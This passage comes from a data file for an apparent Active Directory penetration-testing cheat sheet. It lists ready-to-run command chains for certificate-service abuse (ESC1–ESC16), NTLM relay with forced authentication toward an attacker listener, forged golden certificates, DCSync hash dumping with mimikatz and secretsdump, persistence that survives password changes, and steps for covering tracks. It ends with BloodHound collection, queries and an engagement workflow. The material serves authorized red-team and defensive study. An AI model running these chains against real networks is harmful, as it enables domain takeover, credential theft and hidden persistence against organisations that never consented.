                            code: "# Conditions: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU + Domain Users enrollment\ncertipy req -u '<user>@<DOMAIN>' -p '<pass>' -dc-ip <DC_IP> -target <DC_FQDN> -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'administrator@<DOMAIN>'\n# Use /sid for accuracy on patched DCs\ncertipy req -u '<user>@<DOMAIN>' -p '<pass>' -dc-ip <DC_IP> -target <DC_FQDN> -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'administrator@<DOMAIN>'\ncertipy auth -pfx administrator.pfx -dc-ip <DC_IP> -domain <DOMAIN>",
                            note: "ESC1 — ENROLLEE_SUPPLIES_SUBJECT + Client Auth: request cert for any user, then auth."
                        },
                        {
                            label: "ESC1 (Windows / Certify + Rubeus)",
                            tag: "ESC1",
                            tagClass: "tag-red",
                            code: "# Request with arbitrary SAN; /sid param avoids certificate mismatch on patched DCs\n.\\Certify.exe request /ca:<CA_NAME> /template:ESC1 /altname:<DOMAIN>\\administrator /sid:<DOMAIN_SID>-500\n# Convert PEM to PFX\nopenssl pkcs12 -in cert.pem -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out admin.pfx\n# Get NTLM hash directly or forge TGT\n.\\Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /getcredentials\n# Pass TGT and DCSync\n.\\Rubeus.exe ptt /ticket:<base64_ticket>\n.\\mimikatz.exe \"lsadump::dcsync /domain:<DOMAIN> /user:krbtgt\" \"exit\"",
                            note: "Certify requests the cert; Rubeus /getcredentials extracts NTLM directly without a separate TGT step."
                        },
                        {
                            label: "ESC2 Any Purpose",
                            tag: "ESC2",
                            tagClass: "tag-amber",
                            code: "# Any Purpose EKU (OID 2.5.29.37.0) — on its own does NOT allow user impersonation\n# Becomes dangerous combined with ESC6/ESC9/ESC10 (SAN/SID injection allowed)\ncertipy req -u '<user>@<DOMAIN>' -p '<pass>' -dc-ip <DC_IP> -target <DC_FQDN> -ca '<CA_NAME>' -template '<TEMPLATE>'\ncertipy auth -pfx <PFX> -dc-ip <DC_IP>\n# Windows: convert and use with Rubeus\n.\\Certify.exe request /ca:<CA_NAME> /template:ESC2\nopenssl pkcs12 -in cert.pem -export -out anypurpose.pfx\n.\\Rubeus.exe asktgt /user:<user> /certificate:anypurpose.pfx /password:mimikatz",
                            note: "Any Purpose can bypass code-signing / server-auth checks; full impersonation requires additional CA conditions."
                        },
                        {
                            label: "ESC3 enrollment agent",
                            tag: "ESC3",
                            tagClass: "tag-red",
                            code: "# Step 1: get Enrollment Agent certificate (Certificate Request Agent OID)\ncertipy req -u '<user>@<DOMAIN>' -p '<pass>' -dc-ip <DC_IP> -target <DC_FQDN> -ca '<CA_NAME>' -template EnrollmentAgent\n# Windows: Certify.exe request /ca:<CA_NAME> /template:EnrollmentAgent\n# Step 2: use agent cert to request certificate on-behalf-of privileged user\ncertipy req -u '<user>@<DOMAIN>' -p '<pass>' -dc-ip <DC_IP> -target <DC_FQDN> -ca '<CA_NAME>' -template User -on-behalf-of '<DOMAIN>\\\\<TARGET_USER>' -pfx agent.pfx\n# Windows: .\\Certify.exe request /ca:<CA_NAME> /template:User /onbehalfof:<DOMAIN>\\administrator /enrollcert:agent.pfx /enrollcertpw:mimikatz\ncertipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>",
                            note: "Enrollment Agent certs allow requesting certificates on behalf of any principal — full impersonation chain."
                        },
                        {
                            label: "ESC4 — modify writable template",
                            tag: "ESC4",
                            tagClass: "tag-red",
                            code: "# Need WriteProperty or WriteOwner on a template object\n# Step 1: backup current settings\ncertipy template -u '<user>@<DOMAIN>' -p '<pass>' -dc-ip <DC_IP> -template '<TEMPLATE>' -save-old\n# PowerShell alternative backup\nGet-ADObject 'CN=<TEMPLATE>,CN=Certificate Templates,...' -Properties * | Export-Clixml backup.xml\n# Step 2: enable ENROLLEE_SUPPLIES_SUBJECT (msPKI-Certificate-Name-Flag = 1)\ncertipy template -u '<user>@<DOMAIN>' -p '<pass>' -dc-ip <DC_IP> -template '<TEMPLATE>' -write-default-configuration\n# PowerShell: Set-ADObject ... -Replace @{'msPKI-Certificate-Name-Flag'=1}\n# Step 3: request cert with arbitrary SAN\ncertipy req -u '<user>@<DOMAIN>' -p '<pass>' -dc-ip <DC_IP> -target <DC_FQDN> -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'administrator@<DOMAIN>'\ncertipy auth -pfx administrator.pfx -dc-ip <DC_IP>\n# Step 4: restore template (OPSEC — cover tracks)\ncertipy template -u '<user>@<DOMAIN>' -p '<pass>' -dc-ip <DC_IP> -template '<TEMPLATE>' -configuration '<TEMPLATE>.json'",
                            note: "Modify a template you have WriteProperty on, exploit it as ESC1, then restore — stealthy escalation."
                        }
                    ]
                },
                {
                    title: "ESC5 – ESC8",
                    items: [
                        {
                            label: "ESC5 — PKI object ACL abuse",
                            tag: "ESC5",
                            tagClass: "tag-red",
                            code: "# ESC5: WriteProperty on the CA or Certificate Templates container\n# Enable EDITF_ATTRIBUTESUBJECTALTNAME2 flag (ESC6-equivalent via ESC5 rights)\ncertutil -config '<CA_NAME>' -setreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2\nRestart-Service CertSvc\n# Now request cert with arbitrary SAN from any template\ncertipy req -u '<user>@<DOMAIN>' -p '<pass>' -dc-ip <DC_IP> -target <DC_FQDN> -ca '<CA_NAME>' -template User -upn 'administrator@<DOMAIN>'\ncertipy auth -pfx administrator.pfx -dc-ip <DC_IP>\n# Alternatively: create a new evil template if you have GenericWrite on templates container\n# $templateDN = 'CN=EvilTemplate,CN=Certificate Templates,...'\n# New-ADObject -Name 'EvilTemplate' -Type pKICertificateTemplate ... -OtherAttributes @{'msPKI-Certificate-Name-Flag'=1; 'pKIExtendedKeyUsage'=@('1.3.6.1.5.5.7.3.2')}",
                            note: "ESC5 gives CA-level control; can enable SAN flag or create malicious templates — wider impact than ESC4."
                        },
                        {
                            label: "ESC6 — CA-wide SAN via EditFlags",
                            tag: "ESC6",
                            tagClass: "tag-red",
                            code: "# Check if EDITF_ATTRIBUTESUBJECTALTNAME2 (0x40000) is set\ncertutil -config '<CA_NAME>' -getreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\EditFlags\n# If flag is present, ANY template allows SAN specification\ncertipy req -u '<user>@<DOMAIN>' -p '<pass>' -dc-ip <DC_IP> -target <DC_FQDN> -ca '<CA_NAME>' -template User -upn 'administrator@<DOMAIN>'\n# Windows: .\\Certify.exe request /ca:<CA_NAME> /template:User /altname:administrator@<DOMAIN>\ncertipy auth -pfx administrator.pfx -dc-ip <DC_IP>\n# NOTE (post-KB5014754): ESC6 alone may require ESC9/ESC10 conditions for full impact on patched DCs",
                            note: "CA-wide misconfiguration: EDITF_ATTRIBUTESUBJECTALTNAME2 lets requester supply SAN on any template."
                        },
                        {
                            label: "ESC7 — ManageCA / ManageCertificates",
                            tag: "ESC7",
                            tagClass: "tag-red",
                            code: "# ManageCA: can enable ESC6 flag and grant officer/ManageCertificates to yourself\ncertutil -config '<CA_NAME>' -setreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2\nRestart-Service CertSvc\n# ManageCertificates: can approve pending SubCA template requests\n# Step 1: submit request for privileged user via SubCA template (it will pend)\ncertipy req -u '<user>@<DOMAIN>' -p '<pass>' -dc-ip <DC_IP> -target <DC_FQDN> -ca '<CA_NAME>' -template SubCA -upn 'administrator@<DOMAIN>'\n# Windows: .\\Certify.exe request /ca:<CA_NAME> /template:SubCA /altname:administrator@<DOMAIN>\n# Step 2: approve the pending request\ncertutil -config '<CA_NAME>' -approve <CERT_ID>\n# Step 3: retrieve the issued certificate\ncertipy req -u '<user>@<DOMAIN>' -p '<pass>' -dc-ip <DC_IP> -target <DC_FQDN> -ca '<CA_NAME>' -retrieve <CERT_ID>\ncertipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
                            note: "ManageCA/ManageCertificates on the CA object = full PKI takeover; approve your own requests."
                        },
                        {
                            label: "ESC8 — NTLM relay to web enrollment",
                            tag: "ESC8",
                            tagClass: "tag-red",
                            code: "# Check if ADCS web enrollment endpoint is using NTLM (not EPA / channel-bound)\ncurl -I http://<DC_FQDN>/certsrv/certfnsh.asp\n# Setup: relay NTLM to ADCS HTTP\nntlmrelayx.py -t http://<DC_FQDN>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n# Coerce DC authentication (use any coercion method)\npython3 printerbug.py '<DOMAIN>/<user>:<pass>'@<DC_FQDN> <ATTACKER_IP>\npython3 PetitPotam.py <ATTACKER_IP> <DC_IP>\n# Captured cert arrives as base64; decode and use\ncat /tmp/DC$cert.b64 | base64 -d > dc.pfx\ncertipy auth -pfx dc.pfx -dc-ip <DC_IP> -domain <DOMAIN>\n# Or with Certipy relay (wrapper)\ncertipy relay -target http://<DC_FQDN>/certsrv/ -ca '<CA_NAME>' -template DomainController",
                            note: "Relay machine NTLM to ADCS HTTP — get a machine/DC cert, then PKINIT for NT hash or TGT."
                        }
                    ]
                },
                {
                    title: "ESC9 – ESC14",
                    items: [
                        {
                            label: "ESC9 — no security extension (persistence)",
                            tag: "ESC9",
                            tagClass: "tag-red",
                            code: "# Templates with NO_SECURITY_EXTENSION flag (mspki-enrollment-flag: NO_SECURITY_EXTENSION)\n# Issued certs lack szOID_NTDS_CA_SECURITY_EXT — cert auth survives password changes!\n.\\Certify.exe find /vulnerable\n# Request: cert issued maps only by UPN/SAN, not SID — persists post-password-change\ncertipy req -u '<user>@<DOMAIN>' -p '<pass>' -dc-ip <DC_IP> -target <DC_FQDN> -ca '<CA_NAME>' -template '<TEMPLATE>'\ncertipy auth -pfx <user>.pfx -dc-ip <DC_IP>\n# Windows flow\n.\\Certify.exe request /ca:<CA_NAME> /template:ESC9\nopenssl pkcs12 -in cert.pem -export -out <user>.pfx\n.\\Rubeus.exe asktgt /user:<user> /certificate:<user>.pfx /password:mimikatz\n# Change password — cert STILL authenticates!\nnet user <user> 'NewComplexPass123!' /domain\n.\\Rubeus.exe asktgt /user:<user> /certificate:<user>.pfx /password:mimikatz",
                            note: "Perfect for long-term persistence: NO_SECURITY_EXTENSION certs bypass password-change revocation."
                        },
                        {
                            label: "ESC10A — altSecurityIdentities write",
                            tag: "ESC10",
                            tagClass: "tag-red",
                            code: "# ESC10A: WriteProperty on a user's altSecurityIdentities — map any cert to that account\n# Step 1: create/control a computer and get its certificate\npython3 addcomputer.py -computer-name 'evil$' -computer-pass 'P@ss123!' '<DOMAIN>/<user>:<pass>'  -dc-ip <DC_IP>\n.\\Certify.exe request /ca:<CA_NAME> /template:Machine /machine\n# Step 2: extract Issuer CN and serial from the cert\ncertutil -dump evil.pem   # note: Serial and Issuer\n# Step 3: write X509 mapping to victim's altSecurityIdentities\n# Format: X509:<I>DC=local,DC=<DOMAIN_FIRST>,CN=<CA_NAME><S><REVERSED_SERIAL>\n$mapping = 'X509:<I>DC=local,DC=<DOMAIN_FIRST>,CN=<CA_NAME><S><CERT_SERIAL>'\nSet-ADObject -Identity 'CN=<TARGET_USER>,CN=Users,<DC=DOMAIN>' -Replace @{altSecurityIdentities=$mapping}\n# Step 4: authenticate as the victim using the evil cert\n.\\Rubeus.exe asktgt /user:<TARGET_USER> /certificate:evil.pfx /password:P@ss123!\ncertipy auth -pfx evil.pfx -domain <DOMAIN> -dc-ip <DC_IP>",
                            note: "ESC10A: if you can write altSecurityIdentities you map any cert to any account — full impersonation."
                        },
                        {
                            label: "ESC11 — unencrypted RPC relay",
                            tag: "ESC11",
                            tagClass: "tag-red",
                            code: "# ESC11: IF_ENFORCEENCRYPTICERTREQUEST cleared (InterfaceFlags = 0x0)\n# Verify CA is vulnerable (0x0 = no encryption, 0x200 = hardened)\ncertutil -config '<CA_NAME>' -getreg CA\\InterfaceFlags\n# Relay incoming NTLM to the CA's ICertRequestD DCOM/RPC interface\n# ntlmrelayx.py with ADCS RPC relay module (impacket ≥ 0.11 / custom forks)\nntlmrelayx.py -t rpc://<DC_FQDN> -rpc-mode ICPR -smb2support --adcs --template DomainController\n# Coerce any machine authentication (PetitPotam, PrinterBug, DFSCoerce, etc.)\npython3 PetitPotam.py <ATTACKER_IP> <DC_IP>\n# The relay submits a CSR to the CA via unencrypted RPC on behalf of the coerced machine\n# Convert captured cert and authenticate with PKINIT\ncertipy auth -pfx dc.pfx -dc-ip <DC_IP> -domain <DOMAIN>",
                            note: "ESC11 relays NTLM to the CA's RPC endpoint instead of HTTP — works when certificate web enrollment is absent."
                        },
                        {
                            label: "ESC12 — CA private key (Golden Cert)",
                            tag: "ESC12",
                            tagClass: "tag-red",
                            code: "# ESC12: shell/admin access to CA server — steal CA key and forge certs indefinitely\n# Step 1: backup CA certificate and private key\ncertipy ca -backup -u '<user>@<DOMAIN>' -p '<pass>' -dc-ip <DC_IP> -ca '<CA_NAME>' -target <DC_FQDN>\n# Also works when you have CA admin access\n# Step 2: forge a certificate for any principal\ncertipy forge -ca-pfx '<CA_NAME>.pfx' -upn 'administrator@<DOMAIN>'\n# Optional: add -template to clone a valid template structure (fixes CRL issues)\ncertipy forge -ca-pfx '<CA_NAME>.pfx' -upn 'administrator@<DOMAIN>' -template <user>.pfx\n# Step 3: authenticate (LDAP shell or PKINIT)\ncertipy auth -pfx administrator_forged.pfx -ldap-shell -dc-ip <DC_IP>\n# Or via PKINITtools\ngettgtpkinit.py -cert-pfx administrator_forged.pfx -dc-ip <DC_IP> '<DOMAIN>/administrator' admin.ccache\nexport KRB5CCNAME=$(pwd)/admin.ccache\npython3 secretsdump.py -k -no-pass '<DOMAIN>/administrator'@<DC_FQDN>",
                            note: "Golden Certificate: CA key compromise allows forging any cert — most powerful ADCS post-exploitation."
                        },
                        {
                            label: "ESC13 — issuance policy OID group links",
                            tag: "ESC13",
                            tagClass: "tag-red",
                            code: "# ESC13: template has issuance policy (msPKI-Certificate-Policy) linked to a privileged AD group\n# Linked group must be Universal and empty; common targets: Enterprise Admins, Schema Admins\n# Enumerate: look for msDS-OIDToGroupLink on OID objects\n$oids = Get-ADObject -Filter * -SearchBase 'CN=OID,CN=Public Key Services,...' -Properties msDS-OIDToGroupLink\n$oids | Where-Object {$_.'msDS-OIDToGroupLink'} | Select-Object Name,'msDS-OIDToGroupLink'\n# Certipy v5+ detects ESC13 automatically\ncertipy find -u '<user>@<DOMAIN>' -p '<pass>' -dc-ip <DC_IP> -stdout\n# Request certificate from the linked-policy template\ncertipy req -u '<user>@<DOMAIN>' -p '<pass>' -dc-ip <DC_IP> -target <DC_FQDN> -ca '<CA_NAME>' -template '<TEMPLATE>'\n# Windows: .\\Certify.exe request /ca:<CA_NAME> /template:ESC13Template\ncertipy auth -pfx <user>.pfx -dc-ip <DC_IP>\n# The resulting TGT includes Enterprise Admins group membership PAC entry!\n.\\Rubeus.exe asktgt /user:<user> /certificate:<user>.pfx /password:mimikatz\n# Inject and verify: whoami /groups will show the linked privileged group",
                            note: "ESC13 exploits AMA: cert auth grants membership in the OID-linked group — instant EA/SA without actual membership."
                        },
                        {
                            label: "ESC14 — shadow creds + advanced mapping",
                            tag: "ESC14",
                            tagClass: "tag-red",
                            code: "# ESC14A: altSecurityIdentities manipulation (advanced ESC10 variant)\n# Create a machine account and get its cert (X509IssuerSerialNumber format)\npython3 addcomputer.py -method ldaps -computer-name 'esc14pc$' -computer-pass 'C3rtP@ss!' -dc-ip <DC_IP> '<DOMAIN>/<user>:<pass>'\ncertipy req -target <DC_FQDN> -u 'esc14pc$@<DOMAIN>' -p 'C3rtP@ss!' -dc-ip <DC_IP> -template Machine -ca '<CA_NAME>'\n# Extract Issuer + serial; reverse serial bytes for X509 format\ncertipy cert -pfx esc14pc.pfx -nokey -out esc14pc.crt\nopenssl x509 -in esc14pc.crt -noout -text | grep -E 'Serial|Issuer'\n# Map the cert to a privileged target account via ldap3 or bloodyAD\nbloodyAD ... set object <TARGET_USER> altSecurityIdentities -v 'X509:<I>DC=local,DC=<DOMAIN_FIRST>,CN=<CA_NAME><SR><REVERSED_SERIAL>'\ngettgtpkinit.py -cert-pfx esc14pc.pfx -dc-ip <DC_IP> '<DOMAIN>/<TARGET_USER>' <TARGET_USER>.ccache\n# ESC14B (shadow credentials via pywhisker)\npython3 pywhisker.py -d <DOMAIN> -u <user> -p '<pass>' --target <TARGET_USER> --action add --dc-ip <DC_IP>\ngettgtpkinit.py -cert-pem <TARGET_USER>_shadow.pem -key-pem <TARGET_USER>_shadow.pem '<DOMAIN>/<TARGET_USER>' out.ccache\nexport KRB5CCNAME=$(pwd)/out.ccache",
                            note: "ESC14 covers shadow credentials (msDS-KeyCredentialLink abuse via pywhisker) and X509 cert mapping via altSecurityIdentities."
                        }
                    ]
                },
                {
                    title: "ESC15 & ESC16",
                    items: [
                        {
                            label: "ESC15 — EKUwu app policy injection (CVE-2024-49019)",
                            tag: "ESC15",
                            tagClass: "tag-amber",
                            code: "# ESC15: Version 1 templates don't validate Application Policy extensions\n# Application Policy OID overrides EKU when both present\n# Conditions: v1 template + enrollment rights + Supply in Request subject\n# Step 1: get an enrollment-agent cert via app policy injection on WebServer template\ncertipy req -u '<user>@<DOMAIN>' -p '<pass>' -ca '<CA_NAME>' -template WebServer -dc-ip <DC_IP> -target <DC_FQDN> --application-policies '1.3.6.1.4.1.311.20.2.1'\n# Step 2: use that agent cert to request on-behalf-of a privileged user\ncertipy req -u '<user>@<DOMAIN>' -p '<pass>' -on-behalf-of '<DOMAIN>\\\\administrator' -template User -ca '<CA_NAME>' -pfx <user>.pfx -dc-ip <DC_IP> -target <DC_FQDN>\ncertipy auth -pfx administrator.pfx -dc-ip <DC_IP>\n# Windows certreq alternative\n# Create INF with Application Policy override then certreq -new / -submit",
                            note: "ESC15 (EKUwu) — inject CertRequest Agent app policy into v1 template request; patched Nov 2024 (CVE-2024-49019)."
                        },
                        {
                            label: "ESC16 — CA-wide SID extension removal",
                            tag: "ESC16",
                            tagClass: "tag-red",
                            code: "# ESC16: CA configured to omit szOID_NTDS_CA_SECURITY_EXT (1.3.6.1.4.1.311.25.2) on ALL certs\n# Key difference from ESC9: entire CA is affected, not just one template\n# Certipy v5+ detects it automatically\ncertipy find -u '<user>@<DOMAIN>' -p '<pass>' -dc-ip <DC_IP> -target <DC_FQDN> -stdout\n# Check manually\ncertutil -config '<CA_NAME>' -getreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\DisableExtensionList\n# Exploit: any template with Client Auth EKU can be used to impersonate users\ncertipy req -u '<user>@<DOMAIN>' -p '<pass>' -dc-ip <DC_IP> -target <DC_FQDN> -ca '<CA_NAME>' -template User -upn 'administrator@<DOMAIN>'\ncertipy auth -pfx administrator.pfx -dc-ip <DC_IP>\n# Remediation: remove the OID from DisableExtensionList and restart CertSvc\ncertutil -config '<CA_NAME>' -setreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\DisableExtensionList -'1.3.6.1.4.1.311.25.2'\nRestart-Service CertSvc\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Kdc\\Parameters' -Name StrongCertificateBindingEnforcement -Value 2",
                            note: "ESC16 — CA-wide SID extension removal: ALL certs become exploitable; check DisableExtensionList for the NTDS OID."
                        }
                    ]
                }
            ]
        },
        {
            id: "relay",
            title: "Relay",
            icon: "ti-arrows-exchange",
            sections: [
                {
                    title: "ESC8 / Web Enrollment Relay",
                    items: [
                        {
                            label: "Relay to ADCS web enrollment",
                            tag: "ESC8",
                            tagClass: "tag-red",
                            code: "certipy relay -target http://<DC_FQDN>/certsrv/ -template Machine\ncertipy relay -target http://<DC_FQDN>/certsrv/ -ca '<CA_NAME>' -template DomainController",
                            note: "Relays NTLM to ADCS web enrollment in authorized relay labs."
                        },
                        {
                            label: "Coerce machine auth",
                            tag: "COERCE",
                            tagClass: "tag-amber",
                            code: "python3 PetitPotam.py <ATTACKER_IP> <DC_IP>\npython3 dfscoerce.py -u '<user>' -p '<pass>' -d <DOMAIN> <ATTACKER_IP> <DC_IP>\npython3 printerbug.py '<DOMAIN>/<user>:<pass>'@<DC_FQDN> <ATTACKER_IP>\nnxc smb <DC_IP> -u '<user>' -p '<pass>' -M coerce_plus -o LISTENER=<ATTACKER_IP>",
                            note: "Triggers machine authentication toward a relay listener."
                        },
                        {
                            label: "ntlmrelayx ADCS relay",
                            tag: "ESC8",
                            tagClass: "tag-red",
                            code: "# Relay machine NTLM to ADCS HTTP endpoint and request a machine/DC certificate\ncurl -I http://<DC_FQDN>/certsrv/certfnsh.asp\nntlmrelayx.py -t http://<DC_FQDN>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\npython3 printerbug.py '<DOMAIN>/<user>:<pass>'@<DC_FQDN> <ATTACKER_IP>\n# Convert captured base64 cert\ncat /tmp/DC$cert.b64 | base64 -d > dc.pfx\ncertipy auth -pfx dc.pfx -dc-ip <DC_IP> -domain <DOMAIN>",
                            note: "Classic ESC8 flow against web enrollment when EPA/channel binding is not enforcing."
                        },
                        {
                            label: "ESC11 — RPC relay to DCOM/ICertRequestD",
                            tag: "ESC11",
                            tagClass: "tag-red",
                            code: "# ESC11: CA's RPC interface allows unencrypted requests (InterfaceFlags = 0x0)\n# Relay to ICertRequestD — no web enrollment endpoint required!\ncertutil -config '<CA_NAME>' -getreg CA\\InterfaceFlags\n# 0x0 = vulnerable; 0x200 = IF_ENFORCEENCRYPTICERTREQUEST (hardened)\nntlmrelayx.py -t rpc://<DC_FQDN> -rpc-mode ICPR -smb2support --adcs --template DomainController\npython3 PetitPotam.py <ATTACKER_IP> <DC_IP>\n# Captured cert; use gettgtpkinit for PKINIT\ngettgtpkinit.py -cert-pfx dc.pfx -dc-ip <DC_IP> '<DOMAIN>/dc$' dc.ccache\nexport KRB5CCNAME=$(pwd)/dc.ccache\npython3 secretsdump.py -k -no-pass '<DOMAIN>/dc$'@<DC_FQDN>",
                            note: "ESC11 abuses unencrypted RPC to relay NTLM directly to the CA's DCOM interface — requires no ADCS web role."
                        }
                    ]
                },
                {
                    title: "PKINITtools / Post-Exploit",
                    items: [
                        {
                            label: "gettgtpkinit (PKINIT TGT)",
                            tag: "PKINIT",
                            tagClass: "tag-purple",
                            code: "# Use captured PFX or PEM to obtain a TGT via PKINIT\ngettgtpkinit.py -cert-pfx <user>.pfx -dc-ip <DC_IP> '<DOMAIN>/<user>' <user>.ccache\ngettgtpkinit.py -cert-pem shadow.pem -key-pem shadow.pem '<DOMAIN>/<user>' out.ccache\nexport KRB5CCNAME=$(pwd)/<user>.ccache\nklist\n# Then use for DCSync or lateral movement\npython3 secretsdump.py -k -no-pass '<DOMAIN>/<user>'@<DC_FQDN>",
                            note: "PKINITtools gettgtpkinit requests a TGT from a PFX/PEM — the Linux-side Rubeus PKINIT equivalent."
                        },
                        {
                            label: "Rubeus PKINIT (Windows)",
                            tag: "PKINIT",
                            tagClass: "tag-purple",
                            code: "# Windows PKINIT: request TGT and optionally dump NT hash\n.\\Rubeus.exe asktgt /user:<user> /certificate:<user>.pfx /getcredentials\n.\\Rubeus.exe asktgt /user:<user> /certificate:<user>.pfx /password:mimikatz\n# Inject TGT and DCSync\n.\\Rubeus.exe ptt /ticket:<base64_ticket>\n.\\mimikatz.exe \"lsadump::dcsync /domain:<DOMAIN> /user:krbtgt\" \"exit\"\n# AES256-aware CSP (needed on ADV240011-patched DCs)\n.\\Rubeus.exe asktgt /user:<user> /certificate:<user>.pfx /enctype:aes256 /getcredentials",
                            note: "Rubeus /getcredentials extracts the NT hash directly — no separate pass-the-hash step needed."
                        }
                    ]
                }
            ]
        }
    ],
    bloodhound: [
        {
            id: "collect",
            title: "Collect",
            icon: "ti-share",
            sections: [
                {
                    title: "Collectors",
                    items: [
                        {
                            label: "bloodhound-python",
                            tag: "BH",
                            tagClass: "tag-purple",
                            code: "bloodhound-python -u '<user>' -p '<pass>' -d <DOMAIN> -ns <DC_IP> -dc <DC_FQDN> -c All --zip\nbloodhound-python -u '<user>' --hashes :<NThash> -d <DOMAIN> -ns <DC_IP> -dc <DC_FQDN> -c DCOnly --zip",
                            note: "Collects BloodHound data from Linux using LDAP/SAMR."
                        },
                        {
                            label: "SharpHound PowerShell",
                            tag: "BH",
                            tagClass: "tag-purple",
                            code: "Import-Module .\\SharpHound.ps1\nInvoke-BloodHound -CollectionMethod All -Domain <DOMAIN> -ZipFileName loot.zip\nInvoke-BloodHound -CollectionMethod DCOnly,Group,LocalAdmin,Session,Trusts -Domain <DOMAIN>",
                            note: "Collects BloodHound data from a Windows domain context."
                        },
                        {
                            label: "SharpHound executable",
                            tag: "BH",
                            tagClass: "tag-purple",
                            code: ".\\SharpHound.exe -c All -d <DOMAIN> --zipfilename loot.zip\n.\\SharpHound.exe -c DCOnly,Group,LocalAdmin,Session,Trusts -d <DOMAIN>",
                            note: "Standalone collector useful when PowerShell import is blocked."
                        },
                        {
                            label: "NetExec BloodHound CE",
                            tag: "NXC",
                            tagClass: "tag-purple",
                            code: "# NetExec can collect BloodHound CE data after injecting bloodhound-ce support\npipx inject netexec bloodhound-ce --force\nnxc ldap <DC_IP> -u '<user>' -p '<pass>' --bloodhound --dns-server <DC_IP> --dns-tcp -c all\nnxc ldap <DC_IP> -u '<user>' -H ':<NThash>' --bloodhound --dns-server <DC_IP> -c DCOnly",
                            note: "Collects BloodHound data directly through NetExec LDAP."
                        },
                        {
                            label: "BloodyAD / RustHound collection",
                            tag: "ALT",
                            tagClass: "tag-purple",
                            code: "# Alternate collectors are useful when SharpHound or bloodhound-python fail\nbloodyAD --host <DC_FQDN> -d <DOMAIN> -u <user> -p <password> get bloodhound\nrusthound-ce --host <DC_FQDN> -d <DOMAIN> -u <user> -p <password> -c All\nrusthound-ce -d <DOMAIN> -u <user>@<DOMAIN> -p <password> -f <DOMAIN> -c All",
                            note: "Adds two practical BloodHound collection alternatives from your notes."
                        },
                        {
                            label: "BloodHound CE quick install",
                            tag: "SETUP",
                            tagClass: "tag-gray",
                            code: "# Install BloodHound CE with Docker and the official CLI\nsudo apt install -y docker.io docker-compose\nsudo systemctl enable docker --now\nwget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz\ntar -xvzf bloodhound-cli-linux-amd64.tar.gz\n./bloodhound-cli install",
                            note: "Sets up BloodHound CE locally using Docker and bloodhound-cli."
                        }
                    ]
                },
                {
                    title: "High-Value Queries",
                    items: [
                        {
                            label: "Useful Cypher paths",
                            tag: "QUERY",
                            tagClass: "tag-blue",
                            code: "MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN_UPPER>'})) RETURN p\nMATCH p=(u)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|AddMember|ForceChangePassword]->(v) RETURN p\nMATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name\nMATCH (u)-[:AllowedToDelegate]->(c) RETURN u.name,c.name",
                            note: "Fast queries for privilege paths, ACL abuse, and delegation."
                        },
                        {
                            label: "Post-collection triage",
                            tag: "TRIAGE",
                            tagClass: "tag-amber",
                            code: "Review owned users/computers\nMark cracked accounts as owned\nCheck shortest paths to Domain Admins\nCheck outbound object control for owned principals\nCheck local admin/session paths before noisy exploitation",
                            note: "Keeps BloodHound usage tied to validated attack paths."
                        },
                        {
                            label: "More useful Cypher",
                            tag: "QUERY",
                            tagClass: "tag-blue",
                            code: "# DCSync-capable principals\nMATCH p=(u)-[:DCSync|GetChanges|GetChangesAll]->(d:Domain) RETURN p\n# Computers where owned users are local admins\nMATCH p=(u {owned:true})-[:AdminTo]->(c:Computer) RETURN p\n# Kerberoastable users with adminCount\nMATCH (u:User {hasspn:true}) WHERE u.admincount=true RETURN u.name,u.serviceprincipalnames\n# Pre-Windows 2000 Compatible Access group membership\nMATCH (g:Group) WHERE g.name STARTS WITH 'PRE-WINDOWS 2000 COMPATIBLE ACCESS' RETURN g",
                            note: "Adds common query pivots for DCSync, local admin, Kerberoast, and Pre2K review."
                        }
                    ]
                }
            ]
        }
    ],
    methodology: [
        {
            id: "playbook",
            title: "Playbook",
            icon: "ti-list-check",
            sections: [
                {
                    title: "Workflow",
                    items: [
                        {
                            label: "AD engagement order",
                            tag: "FLOW",
                            tagClass: "tag-green",
                            code: "1. Identify domain, DCs, DNS, and time sync\n2. Enumerate users, groups, computers, SPNs, shares, sessions, trusts\n3. Check credential attacks: AS-REP, Kerberoast, password reuse, PTH/PTT\n4. Map privilege paths: ACLs, ownership, delegation, LAPS, gMSA, BloodHound\n5. Exploit one verified path at a time\n6. Validate impact, collect proof, cleanup artifacts, document detection",
                            note: "Compact methodology from your AD playbook and enumeration notes."
                        },
                        {
                            label: "Data to capture",
                            tag: "SCOPE",
                            tagClass: "tag-blue",
                            code: "Identity: users, groups, disabled/stale accounts\nHosts: computer objects, OS versions, server roles\nAccess: shares, WinRM, local admin, sessions\nKerberos: SPNs, pre-auth disabled, delegation\nPrivilege: ACLs, ownership, high-value groups\nTrust: domain and forest trust relationships",
                            note: "Keeps enumeration focused and report-ready."
                        },
                        {
                            label: "Validation checklist",
                            tag: "CHECK",
                            tagClass: "tag-amber",
                            code: "Confirm recovered account identity\nConfirm privilege level and group membership\nConfirm where the account can authenticate\nConfirm reachable services before running noisy actions\nRecord exact commands, target, timestamp, and cleanup state",
                            note: "Prevents accidental overreach and weak proof."
                        }
                    ]
                }
            ]
        },
        {
            id: "attack-paths",
            title: "Attack Paths",
            icon: "ti-git-branch",
            sections: [
                {
                    title: "Credential Attacks",
                    items: [
                        {
